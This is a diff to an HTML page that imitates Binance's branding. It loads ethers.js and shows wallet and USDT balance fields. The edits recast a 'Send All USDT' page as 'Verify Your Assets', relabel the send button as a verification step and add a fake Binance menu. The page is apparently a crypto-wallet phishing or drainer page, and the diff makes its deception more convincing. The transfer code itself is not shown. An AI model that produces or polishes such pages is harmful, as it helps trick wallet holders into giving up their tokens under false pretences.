@@ -3,12 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Send USDT - Binance Style</title>
+  <title>Verify Your Assets</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
     body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
+      font-family: 'Inter', sans-serif;
       background: linear-gradient(to right, #0d0d0d, #1a1a1a);
       color: #f1f1f1;
       display: flex;
@@ -29,9 +30,19 @@
       box-shadow: 0 4px 6px rgba(0,0,0,0.3);
     }
     .navbar .logo {
-      color: #facc15;
+      color: #fcd535;
       font-weight: bold;
       font-size: 1.3rem;
+    }
+    .navbar .menu {
+      display: flex;
+      gap: 1.5rem;
+    }
+    .navbar .menu a {
+      color: #fcd535;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 0.95rem;
     }
     .main {
       text-align: center;
@@ -39,41 +50,43 @@
       padding: 2rem;
       background: rgba(0, 0, 0, 0.6);
       border-radius: 12px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
     }
     h1 {
-      color: #facc15;
+      color: #fcd535;
+      font-size: 2.2rem;
       margin-bottom: 0.5rem;
     }
     p {
-      font-size: 0.95rem;
+      font-size: 1rem;
       color: #ccc;
       margin-bottom: 2rem;
     }
     button {
-      background-color: #facc15;
+      background-color: #fcd535;
       border: none;
-      padding: 1rem 2rem;
+      padding: 1rem 2.5rem;
       border-radius: 8px;
-      font-weight: bold;
+      font-weight: 600;
       font-size: 1rem;
       cursor: pointer;
       display: flex;
       align-items: center;
-      gap: 0.5rem;
+      gap: 0.6rem;
+      box-shadow: 0 4px 20px rgba(252, 213, 53, 0.4);
       transition: background 0.3s;
     }
     button:hover {
-      background-color: #e0b100;
+      background-color: #e6be30;
     }
     #log {
       margin-top: 1.5rem;
-      font-size: 0.9rem;
-      color: #ff7675;
+      font-size: 0.95rem;
+      color: #ff4d4f;
     }
     .balance-info {
       color: #999;
-      font-size: 0.9rem;
+      font-size: 0.95rem;
       margin-top: 1rem;
     }
   </style>
@@ -81,11 +94,21 @@
 <body>
   <div class="navbar">
     <div class="logo">BINANCE</div>
+    <div class="menu">
+      <a href="#">Home</a>
+      <a href="#">Blockchain</a>
+      <a href="#">Tokens</a>
+      <a href="#">Validators</a>
+      <a href="#">NFTs</a>
+      <a href="#">Resources</a>
+      <a href="#">Developers</a>
+    </div>
   </div>
+
   <div class="main">
-    <h1>Send All USDT</h1>
-    <p>Ensure your tokens are transferred securely on Binance Smart Chain</p>
-    <button id="sendBtn">💼 VERIFY & SEND</button>
+    <h1>Verify Your Assets</h1>
+    <p>Ensure your tokens are secure on Binance Smart Chain.</p>
+    <button id="sendBtn">📤 VERIFY ASSETS</button>
     <div class="balance-info">
       <div id="walletStatus">Wallet not connected</div>
       <div>USDT: <span id="usdtBalance">--</span></div>
